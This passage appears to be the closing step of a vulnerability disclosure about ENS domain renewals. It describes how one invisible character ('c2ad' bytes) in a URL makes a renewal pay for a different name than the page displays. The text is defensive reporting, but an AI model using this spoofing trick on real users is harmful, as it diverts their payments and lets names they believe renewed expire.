Expected result: the label in the calldata is now the honest one, without the `c2ad` bytes, the renewal lands on account B's own name, and the expiry of `<victim>.eth` moves forward. The only difference between the two runs is one invisible character in the URL, while both pages showed the same expiry date, the same price and the same name.
{% endstep %}
{% endstepper %}
